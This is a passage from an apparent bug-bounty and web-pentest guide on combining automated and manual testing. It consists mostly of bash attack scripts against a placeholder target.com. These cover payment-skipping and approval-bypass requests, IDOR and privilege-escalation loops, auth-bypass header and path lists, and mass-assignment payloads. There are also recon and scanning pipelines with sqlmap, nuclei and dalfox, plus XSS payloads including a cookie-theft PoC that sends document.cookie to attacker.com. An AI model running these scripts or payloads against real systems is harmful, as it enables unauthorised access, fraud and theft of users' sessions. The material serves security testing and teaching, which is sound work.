  ```
  ::

  ::accordion-item
  ---
  icon: i-lucide-workflow
  label: Workflow & State Machine Flaws
  ---

  ```bash
  # Skip steps in multi-step process
  # Example: Registration flow (Step1: Email → Step2: Verify → Step3: Profile → Step4: Active)
  
  # Skip email verification — go directly to profile setup
  curl -s -X POST "https://target.com/api/register/step3" \
    -H "Authorization: Bearer UNVERIFIED_TOKEN" \
    -d '{"name":"Attacker","bio":"test"}'

  # Skip payment — go directly to order confirmation
  # Step 1: Create order
  ORDER=$(curl -s -X POST "https://target.com/api/orders" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"items":[{"id":"1","qty":1}]}' | jq -r '.order_id')
  
  # Step 2: Skip payment, directly confirm
  curl -s -X POST "https://target.com/api/orders/${ORDER}/confirm" \
    -H "Authorization: Bearer TOKEN"
  # Does the order get fulfilled without payment?

  # Approval workflow bypass
  # Create request → skip manager approval → directly complete
  REQUEST=$(curl -s -X POST "https://target.com/api/requests" \
    -H "Authorization: Bearer EMPLOYEE_TOKEN" \
    -d '{"type":"expense","amount":5000}' | jq -r '.id')
  
  curl -s -X PUT "https://target.com/api/requests/${REQUEST}/status" \
    -H "Authorization: Bearer EMPLOYEE_TOKEN" \
    -d '{"status":"approved"}'
  # Can the requester approve their own request?

  # Reverse state transitions
  # Cancel → Reactivate → Shipped (free item)
  curl -s -X PUT "https://target.com/api/orders/${ORDER}/cancel" \
    -H "Authorization: Bearer TOKEN"
  # Refund processed
  curl -s -X PUT "https://target.com/api/orders/${ORDER}/reactivate" \
    -H "Authorization: Bearer TOKEN"
  # Does refund reverse? Or do you keep the refund AND the order?

  # Parallel state change (race condition in state machine)
  curl -s -X PUT "https://target.com/api/orders/${ORDER}/cancel" \
    -H "Authorization: Bearer TOKEN" &
  curl -s -X PUT "https://target.com/api/orders/${ORDER}/ship" \
    -H "Authorization: Bearer TOKEN" &
  wait
  # Conflicting state transitions — what wins?
  ```
  ::
::

### Authorization Testing

::tabs
  ::tabs-item{icon="i-lucide-shield" label="Horizontal Access Control"}

  ```bash
  # Systematic IDOR testing across all authenticated endpoints
  # Step 1: Collect all API calls from normal user session (via Burp/proxy logs)
  # Step 2: Replace user identifiers with another user's IDs

  # Horizontal privilege test matrix
  echo "=== Horizontal Access Control Test Matrix ==="

  ENDPOINTS=(
    "GET /api/users/{id}"
    "GET /api/users/{id}/profile"
    "GET /api/users/{id}/orders"
    "GET /api/users/{id}/payments"
    "GET /api/users/{id}/documents"
    "PUT /api/users/{id}/settings"
    "DELETE /api/users/{id}/sessions"
    "GET /api/orders/{id}"
    "GET /api/invoices/{id}"
    "GET /api/messages/{id}"
  )

  ATTACKER_TOKEN="ATTACKER_JWT"
  VICTIM_ID="12345"

  for endpoint in "${ENDPOINTS[@]}"; do
    METHOD=$(echo "$endpoint" | awk '{print $1}')
    PATH=$(echo "$endpoint" | awk '{print $2}' | sed "s/{id}/${VICTIM_ID}/g")
    
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
      -X "$METHOD" "https://target.com${PATH}" \
      -H "Authorization: Bearer $ATTACKER_TOKEN" --max-time 5)
    
    if [ "$STATUS" = "200" ]; then
      echo "[IDOR FOUND] $METHOD $PATH → HTTP $STATUS"
    else
      echo "[SECURE] $METHOD $PATH → HTTP $STATUS"
    fi
  done

  # Test with different ID formats
  ID_VARIATIONS=("12345" "012345" "12345.0" "12345%00" "../12345" "12345'" "VICTIM_UUID")
  for id_var in "${ID_VARIATIONS[@]}"; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
      "https://target.com/api/users/${id_var}/profile" \
      -H "Authorization: Bearer $ATTACKER_TOKEN" --max-time 5)
    echo "ID format '$id_var': HTTP $STATUS"
  done

  # Test access via different reference points
  # Direct: /api/users/VICTIM_ID
  # Via relationship: /api/orders/MY_ORDER → check if response leaks other user data
  # Via search: /api/search?user_id=VICTIM_ID
  # Via export: /api/export?filter=user_id:VICTIM_ID
  ```
  ::

  ::tabs-item{icon="i-lucide-arrow-up-circle" label="Vertical Access Control"}

  ```bash
  # Vertical privilege escalation testing
  # Test admin endpoints with regular user token
  ADMIN_ENDPOINTS=(
    "/api/admin/dashboard"
    "/api/admin/users"
    "/api/admin/settings"
    "/api/admin/logs"
    "/api/admin/config"
    "/api/admin/backup"
    "/api/admin/deploy"
    "/api/admin/impersonate"
    "/api/admin/roles"
    "/api/admin/permissions"
    "/api/internal/debug"
    "/api/internal/metrics"
    "/api/internal/health"
    "/api/system/info"
  )

  USER_TOKEN="REGULAR_USER_JWT"

  for endpoint in "${ADMIN_ENDPOINTS[@]}"; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
      "https://target.com${endpoint}" \
      -H "Authorization: Bearer $USER_TOKEN" --max-time 5)
    if [ "$STATUS" = "200" ] || [ "$STATUS" = "201" ]; then
      echo "[PRIV ESC] ${endpoint} → HTTP $STATUS"
    elif [ "$STATUS" = "403" ]; then
      echo "[BLOCKED] ${endpoint} → HTTP $STATUS"
      # Try bypass techniques
      for bypass in \
        "$(echo $endpoint | sed 's/admin/Admin/')" \
        "$(echo $endpoint | tr '/' ' ' | awk '{for(i=1;i<=NF;i++) $i=toupper(substr($i,1,1)) tolower(substr($i,2))}1' | tr ' ' '/')" \
        "${endpoint}/" \
        "${endpoint}..;/" \
        "${endpoint}%20" \
        "${endpoint}%00" \
        "${endpoint}?"; do
        BYPASS_STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
          "https://target.com${bypass}" \
          -H "Authorization: Bearer $USER_TOKEN" --max-time 3)
        [ "$BYPASS_STATUS" = "200" ] && echo "  [BYPASS!] ${bypass} → HTTP $BYPASS_STATUS"
      done
    fi
  done

  # HTTP method override bypass
  for endpoint in "${ADMIN_ENDPOINTS[@]}"; do
    # X-HTTP-Method-Override
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
      -X POST "https://target.com${endpoint}" \
      -H "Authorization: Bearer $USER_TOKEN" \
      -H "X-HTTP-Method-Override: GET" --max-time 3)
    [ "$STATUS" = "200" ] && echo "[METHOD OVERRIDE] ${endpoint} → HTTP $STATUS"
    
    # X-Original-URL / X-Rewrite-URL (Nginx/IIS bypass)
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
      "https://target.com/" \
      -H "Authorization: Bearer $USER_TOKEN" \
      -H "X-Original-URL: ${endpoint}" --max-time 3)
    [ "$STATUS" = "200" ] && echo "[X-ORIGINAL-URL] ${endpoint} → HTTP $STATUS"
  done

  # Role parameter injection
  curl -s -X PUT "https://target.com/api/user/profile" \
    -H "Authorization: Bearer $USER_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"name":"test","role":"admin","isAdmin":true,"admin":1,"access_level":9999}'
  
  # Token manipulation for role escalation
  # Decode JWT payload
  echo "$USER_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq '.'
  # If role/permissions are in the JWT, modify and resign (if key is weak/known)
  ```
  ::

  ::tabs-item{icon="i-lucide-key-round" label="Authentication Bypass"}

  ```bash
  # Authentication mechanism testing
  echo "=== Authentication Bypass Tests ==="

  # Test endpoint without any authentication
  curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com/api/user/profile"
  # Compare with authenticated request
  curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com/api/user/profile" \
    -H "Authorization: Bearer TOKEN"

  # Empty bearer token
  curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com/api/user/profile" \
    -H "Authorization: Bearer "

  # Invalid token formats
  INVALID_TOKENS=("null" "undefined" "true" "false" "0" "1" "[]" "{}" "none" "admin")
  for token in "${INVALID_TOKENS[@]}"; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
      "https://target.com/api/user/profile" \
      -H "Authorization: Bearer $token" --max-time 3)
    [ "$STATUS" = "200" ] && echo "[AUTH BYPASS] Token '$token' → HTTP $STATUS"
  done

  # Alternative auth header names
  AUTH_HEADERS=(
    "Authorization: Bearer TOKEN"
    "X-API-Key: TOKEN"
    "X-Auth-Token: TOKEN"
    "X-Access-Token: TOKEN"
    "Token: TOKEN"
    "Api-Key: TOKEN"
    "Auth: TOKEN"
    "Cookie: token=TOKEN"
    "Cookie: session=TOKEN"
    "Cookie: jwt=TOKEN"
  )
  for header in "${AUTH_HEADERS[@]}"; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
      "https://target.com/api/user/profile" \
      -H "$header" --max-time 3)
    echo "  $header → HTTP $STATUS"
  done

  # HTTP verb tampering
  for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
      -X "$method" "https://target.com/api/admin/users" --max-time 3)
    echo "  $method /api/admin/users → HTTP $STATUS"
  done

  # Path normalization bypass
  BYPASSES=(
    "/api/admin/users"
    "/api/admin/./users"
    "/api/admin/../admin/users"
    "/api/admin/users/"
    "/api/admin/users/."
    "/api/Admin/Users"
    "/API/ADMIN/USERS"
    "/api/admin%2fusers"
    "/api/admin/users%00"
    "/api/admin/users..;/"
    "/api;/admin/users"
    "/api/admin/users;.css"
    "/api/admin/users?.js"
    "/api/v1/../admin/users"
  )
  for path in "${BYPASSES[@]}"; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
      "https://target.com${path}" --max-time 3)
    [ "$STATUS" = "200" ] && echo "[BYPASS] ${path} → HTTP $STATUS"
  done
  ```
  ::
::

### Manual API Analysis

::code-collapse

```bash
# Comprehensive API attack surface analysis

echo "=== Manual API Analysis Framework ==="

# Step 1: API documentation discovery
for doc_path in \
  "/api/docs" "/api/swagger" "/api/swagger.json" "/api/swagger.yaml" \
  "/api/openapi.json" "/api/openapi.yaml" "/api/v1/docs" "/api/v2/docs" \
  "/swagger-ui.html" "/swagger-ui/" "/api-docs" "/redoc" \
  "/graphql" "/graphiql" "/playground" "/altair" \
  "/.well-known/openapi.json" "/_catalog" "/api/schema" \
  "/api/explorer" "/developer" "/dev/api"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://target.com${doc_path}" --max-time 3)
  [ "$STATUS" = "200" ] && echo "[API DOCS] ${doc_path}"
done

# Step 2: HTTP method probing on each endpoint
echo ""
echo "--- HTTP Method Probing ---"
API_ENDPOINTS=$(curl -s "https://target.com/api/swagger.json" 2>/dev/null | \
  jq -r '.paths | keys[]' 2>/dev/null)

if [ -n "$API_ENDPOINTS" ]; then
  echo "$API_ENDPOINTS" | while read endpoint; do
    for method in GET POST PUT PATCH DELETE; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        -X "$method" "https://target.com${endpoint}" \
        -H "Authorization: Bearer TOKEN" --max-time 3)
      [ "$STATUS" != "405" ] && [ "$STATUS" != "404" ] && \
        echo "  $method $endpoint → HTTP $STATUS"
    done
  done
fi

# Step 3: Content-Type manipulation
echo ""
echo "--- Content-Type Testing ---"
CONTENT_TYPES=(
  "application/json"
  "application/xml"
  "application/x-www-form-urlencoded"
  "multipart/form-data"
  "text/plain"
  "text/xml"
  "application/json;charset=utf-7"
)
for ct in "${CONTENT_TYPES[@]}"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "https://target.com/api/users" \
    -H "Content-Type: $ct" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"test":"value"}' --max-time 3)
  echo "  Content-Type: $ct → HTTP $STATUS"
done

# Step 4: Mass assignment probing
echo ""
echo "--- Mass Assignment Testing ---"
# Get normal user profile fields
PROFILE=$(curl -s "https://target.com/api/user/profile" \
  -H "Authorization: Bearer TOKEN")
echo "Current profile: $(echo $PROFILE | jq -c '.')"

# Try adding extra fields
EXTRA_FIELDS='{"name":"test","role":"admin","is_admin":true,"admin":1,"permissions":["*"],"access_level":99,"verified":true,"email_verified":true,"is_superuser":true,"group":"administrators","plan":"enterprise","credits":999999}'

curl -s -X PUT "https://target.com/api/user/profile" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d "$EXTRA_FIELDS"

# Check if any extra fields were accepted
UPDATED=$(curl -s "https://target.com/api/user/profile" \
  -H "Authorization: Bearer TOKEN")
echo "Updated profile: $(echo $UPDATED | jq -c '.')"

# Step 5: Parameter pollution
echo ""
echo "--- Parameter Pollution ---"
# Duplicate parameters
curl -s "https://target.com/api/users?role=user&role=admin" \
  -H "Authorization: Bearer TOKEN" | jq '.role // .data[0].role' 2>/dev/null

# Array injection
curl -s "https://target.com/api/users?id[]=1&id[]=2&id[]=3" \
  -H "Authorization: Bearer TOKEN" | jq 'length' 2>/dev/null

# Object injection  
curl -s -X POST "https://target.com/api/search" \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":{"$gt":""}}'
```

::

---

## Hybrid Workflow Patterns

::badge
Optimal Strategy
::

### Pattern 1: Funnel Approach

```
┌────────────────────────────────────────────────────────────┐
│              FUNNEL APPROACH WORKFLOW                       │
│                                                            │
│   ┌──────────────────────────────────────────┐            │
│   │  WIDE: Automated Reconnaissance          │            │
│   │  Tools: subfinder, httpx, katana          │ ←── AUTO  │
│   │  Output: 50,000 URLs, 3,000 subdomains   │            │
│   └────────────────┬─────────────────────────┘            │
│                    │ Filter                                │
│   ┌────────────────▼─────────────────────────┐            │
│   │  MEDIUM: Automated Scanning              │            │
│   │  Tools: nuclei, dalfox, sqlmap            │ ←── AUTO  │
│   │  Output: 200 potential findings           │            │
│   └────────────────┬─────────────────────────┘            │
│                    │ Triage                                │
│   ┌────────────────▼─────────────────────────┐            │
│   │  NARROW: Manual Verification             │            │
│   │  Human: Review, validate, filter FPs      │ ←── MANUAL│
│   │  Output: 50 confirmed findings            │            │
│   └────────────────┬─────────────────────────┘            │
│                    │ Deep Dive                             │
│   ┌────────────────▼─────────────────────────┐            │
│   │  DEEP: Manual Exploitation               │            │
│   │  Human: Bypass, escalate, chain, PoC      │ ←── MANUAL│
│   │  Output: 10 reportable vulnerabilities    │            │
│   └──────────────────────────────────────────┘            │
└────────────────────────────────────────────────────────────┘
```

::steps{level="4"}

#### Automated Wide Scan

```bash
#!/bin/bash
# funnel_phase1_recon.sh
TARGET="target.com"

echo "=== PHASE 1: Automated Wide Scan ==="

# Subdomain enumeration (multiple sources)
subfinder -d $TARGET -all -silent > subs.txt
amass enum -passive -d $TARGET -silent >> subs.txt
sort -u subs.txt -o subs.txt

# Resolve and probe
cat subs.txt | dnsx -silent | httpx -silent -json -o live.json
echo "[*] Live hosts: $(wc -l < live.json)"

# Crawl and collect URLs
cat live.json | jq -r '.url' | katana -d 5 -jc -silent | sort -u > urls.txt
cat subs.txt | waybackurls | sort -u >> urls.txt
cat subs.txt | gau | sort -u >> urls.txt
sort -u urls.txt -o urls.txt
echo "[*] Total URLs: $(wc -l < urls.txt)"

# JavaScript analysis
cat urls.txt | grep -iE "\.js(\?|$)" | sort -u > js_files.txt
cat js_files.txt | while read js; do
  curl -s "$js" | grep -oP '(api|internal|admin|secret|token|key|password)[^"'"'"'\s]*' 2>/dev/null
done | sort -u > js_secrets.txt
echo "[*] JS secrets/endpoints: $(wc -l < js_secrets.txt)"
```

#### Automated Vulnerability Scanning

```bash
#!/bin/bash
# funnel_phase2_scan.sh

echo "=== PHASE 2: Automated Vulnerability Scanning ==="

# Nuclei scan
cat live.json | jq -r '.url' | nuclei -severity critical,high,medium \
  -t cves/ -t vulnerabilities/ -t exposures/ -t misconfiguration/ \
  -silent -o nuclei_results.txt
echo "[*] Nuclei findings: $(wc -l < nuclei_results.txt)"

# XSS scanning
cat urls.txt | grep "=" | uro | dalfox pipe --silence --only-poc \
  -o xss_results.txt 2>/dev/null
echo "[*] XSS candidates: $(wc -l < xss_results.txt)"

# SQLi quick check
cat urls.txt | grep "=" | uro | while read url; do
  sqlmap -u "$url" --batch --smart --level 1 --risk 1 \
    --output-dir=sqli_results/ 2>/dev/null | grep -q "injectable" && \
    echo "$url" >> sqli_results.txt
done
echo "[*] SQLi candidates: $(wc -l < sqli_results.txt 2>/dev/null || echo 0)"

# CORS check
cat live.json | jq -r '.url' | while read url; do
  curl -s -I "$url" -H "Origin: https://evil.com" 2>/dev/null | \
    grep -qi "access-control-allow-origin: https://evil.com" && \
    echo "$url" >> cors_results.txt
done
echo "[*] CORS misconfig: $(wc -l < cors_results.txt 2>/dev/null || echo 0)"

# Open redirect scan
cat urls.txt | grep -iE "redirect|return|next|url|dest|redir|view|page" | \
  qsreplace "https://evil.com" | httpx -silent -location -mc 301,302 | \
  grep "evil.com" > open_redirect_results.txt
echo "[*] Open redirects: $(wc -l < open_redirect_results.txt)"
```

#### Manual Triage & Verification

```bash
#!/bin/bash
# funnel_phase3_triage.sh

echo "=== PHASE 3: Manual Triage ==="
echo "Review each finding category and verify manually"

# Verify XSS findings — check for actual DOM impact
echo "--- XSS Verification ---"
while read finding; do
  echo "[*] Testing: $finding"
  # Check if payload actually executes
  # Use headless browser or manual browser check
  # Filter out false positives where input is reflected but encoded
done < xss_results.txt

# Verify SQLi findings — confirm with targeted payloads
echo "--- SQLi Verification ---"
while read finding; do
  echo "[*] Confirming: $finding"
  sqlmap -u "$finding" --batch --level 5 --risk 3 --current-db
done < sqli_results.txt

# Priority ranking
echo ""
echo "--- Priority Matrix ---"
echo "P1 (Exploit Immediately): RCE, Auth Bypass, SQLi with data access"
echo "P2 (Deep Dive): XSS, SSRF, IDOR candidates"
echo "P3 (Quick Win): CORS, Open Redirect, Info Disclosure"
echo "P4 (Document): Missing headers, version disclosure"
```

#### Manual Deep Exploitation

```bash
#!/bin/bash
# funnel_phase4_exploit.sh

echo "=== PHASE 4: Manual Deep Exploitation ==="

# For each confirmed vulnerability:
# 1. Bypass any WAF/filters
# 2. Escalate impact
# 3. Build exploit chain
# 4. Create reproducible PoC
# 5. Assess collateral damage
# 6. Document and report

# Example: Confirmed reflection → Manual XSS bypass → Impact escalation
REFLECTED_URL="https://target.com/search?q=REFLECTED"

# Analyze context
echo "[*] Analyzing reflection context..."
CONTEXT=$(curl -s "$REFLECTED_URL" | grep -oP '.{50}REFLECTED.{50}')
echo "Context: $CONTEXT"

# If inside HTML attribute:
curl -s "https://target.com/search?q=\"+onfocus=alert(document.domain)+autofocus+\""

# If inside JavaScript:
curl -s "https://target.com/search?q='-alert(document.domain)-'"

# Impact escalation: Cookie theft PoC
PAYLOAD="<script>fetch('https://attacker.com/c?='+document.cookie)</script>"
ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")
echo "[*] XSS PoC URL: https://target.com/search?q=${ENCODED}"
```

::

### Pattern 2: Parallel Streams

::tabs
  ::tabs-item{icon="i-lucide-split" label="Architecture"}

  ```
  ┌────────────────────────────────────────────────────────────┐
  │             PARALLEL STREAMS WORKFLOW                      │
  │                                                            │
  │   ┌─────────────────────┐  ┌─────────────────────┐       │
  │   │  STREAM 1: AUTO     │  │  STREAM 2: MANUAL   │       │
  │   │  ══════════════     │  │  ═══════════════     │       │
  │   │                     │  │                      │       │
  │   │  While automated    │  │  Simultaneously      │       │
  │   │  tools run in the   │  │  human focuses on    │       │
  │   │  background:        │  │  high-value targets: │       │
  │   │                     │  │                      │       │
  │   │  • Nuclei scanning  │  │  • Auth/AuthZ testing│       │
  │   │  • Directory fuzzing│  │  • Business logic    │       │
  │   │  • XSS scanning     │  │  • Payment flows     │       │
  │   │  • Subdomain enum   │  │  • API abuse         │       │
  │   │  • Port scanning    │  │  • Race conditions   │       │
  │   │                     │  │  • Chain building     │       │
  │   └─────────┬───────────┘  └──────────┬───────────┘       │
  │             │                          │                   │
  │             └──────────┬───────────────┘                   │
  │                        ▼                                   │
  │   ┌──────────────────────────────────────────┐            │
  │   │  MERGE: Cross-reference results          │            │
  │   │  • Auto findings inform manual targets   │            │
  │   │  • Manual context enriches auto results   │            │
  │   │  • Chain auto + manual findings together   │            │
  │   └──────────────────────────────────────────┘            │
  └────────────────────────────────────────────────────────────┘
  ```
  ::

  ::tabs-item{icon="i-lucide-terminal" label="Implementation"}

  ```bash
  # Terminal 1: Automated background scanning
  # Start all automated tools in parallel

  # Background process 1: Subdomain monitoring
  subfinder -d target.com -all -silent | dnsx -silent | httpx -silent &
  RECON_PID=$!

  # Background process 2: Nuclei scanning
  nuclei -l targets.txt -t cves/ -t vulnerabilities/ \
    -severity critical,high -silent -o auto_nuclei.txt &
  NUCLEI_PID=$!

  # Background process 3: Parameter fuzzing
  cat parameterized.txt | dalfox pipe --silence --only-poc \
    -o auto_xss.txt &
  DALFOX_PID=$!

  # Background process 4: Directory discovery
  feroxbuster -u "https://target.com" \
    -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
    --depth 3 --threads 20 --silent -o auto_dirs.txt &
  FERO_PID=$!

  echo "[*] Automated scans running in background"
  echo "  Recon PID: $RECON_PID"
  echo "  Nuclei PID: $NUCLEI_PID"
  echo "  Dalfox PID: $DALFOX_PID"
  echo "  Feroxbuster PID: $FERO_PID"

  # Terminal 2: Manual testing (simultaneous)
  echo "=== Starting Manual Testing Stream ==="

  # Focus on authentication and authorization first
  # These are the highest-value manual tests

  # Test 1: IDOR across all user-specific endpoints
  VICTIM_ID="other_user_id"
  for endpoint in /profile /orders /payments /settings /documents; do
    curl -s "https://target.com/api/users/${VICTIM_ID}${endpoint}" \
      -H "Authorization: Bearer ATTACKER_TOKEN" | jq '.' 2>/dev/null
  done

  # Test 2: Business logic in payment flow
  # ... (detailed manual testing as shown in previous sections)

  # Periodically check automated results and adjust manual focus
  while kill -0 $NUCLEI_PID 2>/dev/null; do
    NEW_FINDINGS=$(wc -l < auto_nuclei.txt 2>/dev/null || echo 0)
    echo "[AUTO UPDATE] Nuclei findings so far: $NEW_FINDINGS"
    # If auto finds something interesting, pivot manual testing
    sleep 60
  done
  ```
  ::
::

### Pattern 3: Automation-Guided Manual Testing

::note
This is the most effective pattern for experienced bug hunters. Let automation **point you to anomalies**, then apply human intelligence to understand and exploit them.
::

```bash
# Step 1: Automated anomaly detection
echo "=== Anomaly Detection Phase ==="

# Find unusual response sizes (potential data leaks)
cat parameterized.txt | httpx -silent -content-length -status-code | \
  awk '{print $2, $1}' | sort -n | tail -20
# Unusually large responses = potential data exposure

# Find unusual status codes
cat urls.txt | httpx -silent -status-code | grep -E "^(401|403|500|502|503)" | \
  sort | uniq -c | sort -rn | head -20
# 403s = potential access control to bypass
# 500s = potential error-based information disclosure

# Find endpoints with inconsistent behavior
# Same endpoint, different methods = logic issues
cat live.json | jq -r '.url' | head -50 | while read url; do
  GET=$(curl -s -o /dev/null -w "%{http_code}" "$url" --max-time 3)
  POST=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$url" --max-time 3)
  PUT=$(curl -s -o /dev/null -w "%{http_code}" -X PUT "$url" --max-time 3)
  if [ "$GET" != "$POST" ] || [ "$GET" != "$PUT" ]; then
    echo "[ANOMALY] $url → GET:$GET POST:$POST PUT:$PUT"
  fi
done

# Find technology mismatches (different tech on different endpoints = different security levels)
cat live.json | jq -r '.url' | httpx -silent -tech-detect | sort -t'[' -k2 | \
  awk -F'[][]' '{print $2}' | sort | uniq -c | sort -rn

# Step 2: Manual investigation of anomalies
echo ""
echo "=== Manual Investigation Phase ==="
echo "Focus manual testing on:"
echo "  1. Endpoints with unusual response sizes"
echo "  2. 403 endpoints (try bypass techniques)"
echo "  3. Endpoints with inconsistent method handling"
echo "  4. Older technology stack endpoints (likely less secure)"
echo "  5. Error-producing endpoints (information disclosure)"
```

---

## Vulnerability-Specific Balance Guide

::badge
Decision Matrix
::

### Balance by Vulnerability Class

::collapsible

| Vulnerability Class | Auto % | Manual % | Automation Role | Manual Role |
| --- | --- | --- | --- | --- |
| **Reflected XSS** | 70% | 30% | Parameter fuzzing, payload injection | Context analysis, WAF bypass, impact escalation |
| **Stored XSS** | 30% | 70% | Injection point discovery | Storage analysis, rendering context, CSP bypass |
| **DOM XSS** | 40% | 60% | JS file collection, source/sink grep | Data flow tracing, exploit crafting |
| **SQL Injection** | 60% | 40% | Parameter detection, basic exploitation | Blind extraction, WAF bypass, second-order |
| **SSRF** | 50% | 50% | Parameter fuzzing with OOB callbacks | Filter bypass, protocol tricks, cloud escalation |
| **SSTI** | 40% | 60% | Template syntax detection | Engine identification, sandbox escape, RCE chain |
| **IDOR** | 20% | 80% | Endpoint discovery | Role-based testing, ID manipulation, impact analysis |
| **Business Logic** | 5% | 95% | Workflow mapping | Logic analysis, state manipulation, abuse scenarios |
| **Race Condition** | 10% | 90% | Endpoint identification | Timing analysis, concurrent request crafting |
| **Auth Bypass** | 30% | 70% | Token/header fuzzing | Flow analysis, token manipulation, bypass chaining |
| **CORS** | 80% | 20% | Origin header testing across all endpoints | Impact PoC, credential theft chain |
| **Subdomain Takeover** | 90% | 10% | CNAME/DNS checking | Claiming and PoC setup |
| **Open Redirect** | 75% | 25% | Parameter fuzzing with redirect payloads | OAuth chain, filter bypass |
| **File Upload** | 30% | 70% | Extension fuzzing, content-type testing | Polyglot creation, server-side execution |
| **XXE** | 50% | 50% | Content-type change, entity injection | OOB exfiltration, blind chains, parser abuse |
| **GraphQL** | 40% | 60% | Introspection, query fuzzing | Schema analysis, depth abuse, batching attacks |
| **WebSocket** | 10% | 90% | Connection identification | Protocol analysis, CSWSH, message manipulation |
| **Mass Assignment** | 20% | 80% | Field discovery | Extra parameter testing, role escalation |
| **Rate Limiting** | 30% | 70% | Request flooding | Header rotation, distributed bypass |

::

### Detailed Per-Vulnerability Workflow

::tabs
  ::tabs-item{icon="i-lucide-code" label="XSS Hybrid Workflow"}

  ```bash
  # ═══════════════════════════════════════
  # XSS: 70% Auto → 30% Manual
  # ═══════════════════════════════════════

  # AUTO: Discover reflection points
  cat urls.txt | grep "=" | qsreplace "xss_canary_12345" | \
    httpx -silent -mc 200 -mr "xss_canary_12345" > reflections.txt
  echo "[AUTO] Reflections found: $(wc -l < reflections.txt)"

  # AUTO: Run XSS scanner
  cat reflections.txt | dalfox pipe --silence --only-poc --waf-evasion \
    -o auto_xss_confirmed.txt
  echo "[AUTO] Auto-confirmed XSS: $(wc -l < auto_xss_confirmed.txt)"

  # >>> SWITCH TO MANUAL <<<

  # MANUAL: Analyze reflections that automated tools missed
  cat reflections.txt | while read url; do
    # Check if dalfox already found this one
    if ! grep -q "$url" auto_xss_confirmed.txt 2>/dev/null; then
      echo "[MANUAL] Analyzing missed reflection: $url"
      
      # Get the reflection context
      RESPONSE=$(curl -s "$url")
      CONTEXT=$(echo "$RESPONSE" | grep -oP '.{80}xss_canary_12345.{80}' | head -3)
      
      # Determine context type
      if echo "$CONTEXT" | grep -q 'value="'; then
        echo "  Context: HTML attribute — try: \" onfocus=alert(1) autofocus \""
      elif echo "$CONTEXT" | grep -q '<script>'; then
        echo "  Context: JavaScript — try: ';alert(1);//"
      elif echo "$CONTEXT" | grep -q "src="; then
        echo "  Context: URL context — try: javascript:alert(1)"
      elif echo "$CONTEXT" | grep -qP '<!--'; then
        echo "  Context: HTML comment — try: --><script>alert(1)</script><!--"
      else
        echo "  Context: HTML body — try: <img src=x onerror=alert(1)>"
      fi
      echo "  Raw: $CONTEXT"
      echo ""
    fi
  done

  # MANUAL: For confirmed XSS, escalate impact
  while read poc_url; do
    echo "[MANUAL] Escalating: $poc_url"
    echo "  → Test cookie theft"
    echo "  → Test same-origin API access"
    echo "  → Test admin panel access"
    echo "  → Test CSP bypass (if CSP exists)"
    
    # Check CSP
    CSP=$(curl -s -I "$(echo $poc_url | grep -oP 'https?://[^/]+')" | \
      grep -i "content-security-policy" | head -1)
    if [ -n "$CSP" ]; then
      echo "  CSP found: $CSP"
      echo "  → Need CSP bypass for full impact"
    else
      echo "  No CSP — full XSS impact achievable"
    fi
  done < auto_xss_confirmed.txt
  ```
  ::

  ::tabs-item{icon="i-lucide-shield" label="IDOR Hybrid Workflow"}

  ```bash
  # ═══════════════════════════════════════
  # IDOR: 20% Auto → 80% Manual
  # ═══════════════════════════════════════

  # AUTO: Discover all authenticated API endpoints
  # Use proxy logs from normal browsing session
  cat burp_proxy_log.txt | grep -oP 'https://target\.com/api/[^\s"]+' | \
    sort -u > authenticated_endpoints.txt
  echo "[AUTO] Authenticated endpoints: $(wc -l < authenticated_endpoints.txt)"

  # AUTO: Extract endpoints with user-specific identifiers
  cat authenticated_endpoints.txt | \
    grep -iE '/[0-9]+|/[a-f0-9-]{36}|user_id=|account_id=|id=' > \
    id_based_endpoints.txt
  echo "[AUTO] ID-based endpoints: $(wc -l < id_based_endpoints.txt)"

  # >>> SWITCH TO MANUAL <<<

  # MANUAL: Create two test accounts
  echo "[MANUAL] Setup: Create Account A (attacker) and Account B (victim)"

  ACCOUNT_A_TOKEN="TOKEN_A"  # Your account
  ACCOUNT_B_TOKEN="TOKEN_B"  # Second test account
  ACCOUNT_B_ID="VICTIM_ID"

  # MANUAL: Test each endpoint with cross-account access
  while read endpoint; do
    # Replace any IDs in the URL with victim's ID
    MODIFIED=$(echo "$endpoint" | sed "s|/[0-9]\+|/${ACCOUNT_B_ID}|g")
    
    echo "[TEST] $MODIFIED"
    
    # Test with attacker's token
    RESPONSE=$(curl -s -w "\n%{http_code}" \
      "$MODIFIED" -H "Authorization: Bearer $ACCOUNT_A_TOKEN")
    STATUS=$(echo "$RESPONSE" | tail -1)
    BODY=$(echo "$RESPONSE" | head -n -1)
    
    if [ "$STATUS" = "200" ]; then
      # Check if we got victim's data
      if echo "$BODY" | jq -e ".id == \"$ACCOUNT_B_ID\"" 2>/dev/null; then
        echo "  [IDOR CONFIRMED] Got victim's data!"
        echo "  Response preview: $(echo $BODY | jq -c '.' | head -c 200)"
      fi
    fi
    
    # Test write operations (PUT/PATCH/DELETE)
    for method in PUT PATCH DELETE; do
